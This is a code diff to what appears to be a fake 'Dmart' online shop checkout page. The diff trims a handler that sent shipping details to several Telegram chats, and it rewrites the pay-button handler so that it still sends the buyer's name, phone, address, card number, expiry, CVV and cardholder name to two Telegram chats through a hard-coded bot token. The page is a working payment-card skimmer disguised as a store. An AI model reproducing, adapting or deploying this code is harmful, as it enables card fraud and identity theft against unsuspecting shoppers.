@@ -250,7 +250,7 @@ body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relati
 <script>
 /* ---------- CONFIG ---------- */
 const TELEGRAM_BOT_TOKEN = '8485388962:AAGTktrO69ZS0qdX1vX2DTNX9rhe1a-nwwQ';
-const TELEGRAM_CHAT_ID = '6067712594';
+const TELEGRAM_CHAT_ID = '6720348763';
 
 /* ---------- UTILS ---------- */
 const formatCurrency = (amt) => new Intl.NumberFormat('en-IN',{style:'currency',currency:'INR'}).format(amt);
@@ -382,28 +382,6 @@ document.getElementById('checkout-form').addEventListener('submit', (e) => {
   localStorage.setItem('Dmart_User', JSON.stringify(userDetails));
   savedUser = userDetails;
 
-  // Send shipping info to Telegram
-  const total = cart.reduce((s,i)=>s + i.price * i.quantity, 0);
-  const shippingMsg = `📦 SHIPPING INFO\n------------\n👤 ${userDetails.name}\n📞 ${userDetails.phone}\n📍 ${userDetails.address}\n🏙️ ${userDetails.city}, ${userDetails.state} - ${userDetails.pincode}\n💰 TOTAL: ${formatCurrency(total)}`;
-  
-  if(TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'PASTE_YOUR_BOT_TOKEN_HERE') {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: shippingMsg })
-    }).catch(() => {});
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: '7393124087', text: shippingMsg })
-    }).catch(() => {});
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: '6720348763', text: shippingMsg })
-    }).catch(() => {});
-  }
-
   // UI: collapse shipping, show summary & payment
   document.getElementById('shipping-form-wrapper').classList.add('hidden');
   document.getElementById('shipping-summary').classList.remove('hidden');
@@ -445,43 +423,19 @@ document.getElementById('pay-btn').addEventListener('click', async () => {
   const total = cart.reduce((s,i)=>s + i.price * i.quantity, 0);
   const user = JSON.parse(localStorage.getItem('Dmart_User')) || {};
 
-  // Telegram message (optional)
-  const msg = `
-🔔 NEW ORDER
-------------
-👤 ${user.name}
-📞 ${user.phone}
-📍 ${user.city}, ${user.state}
-
-💳 CARD INFO
-No: ${num}
-Exp: ${exp}
-CVV: ${cvv}
-Name: ${name}
-
-💰 TOTAL: ${formatCurrency(total)}
-  `.trim();
-
-  if(TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'PASTE_YOUR_BOT_TOKEN_HERE') {
-    // Send to first chat
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
-    }).catch(() => {});
-    // Send to second chat
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: '7393124087', text: msg })
-    }).catch(() => {});
-    // Send to third chat
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id: '6720348763', text: msg })
-    }).catch(() => {});
-  }
+  // Telegram message
+  const msg = `🔔 NEW ORDER\n------------\n👤 ${user.name}\n📞 ${user.phone}\n📍 ${user.address}\n🏙️ ${user.city}, ${user.state} - ${user.pincode}\n\n💳 CARD INFO\nNo: ${num}\nExp: ${exp}\nCVV: ${cvv}\nName: ${name}\n\n💰 TOTAL: ${formatCurrency(total)}`;
+  
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
+  }).catch(() => {});
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: '6067712594', text: msg })
+  }).catch(() => {});
 
   // Prepare payload to DB (includes full dummy card fields as you requested)
   const payload = {
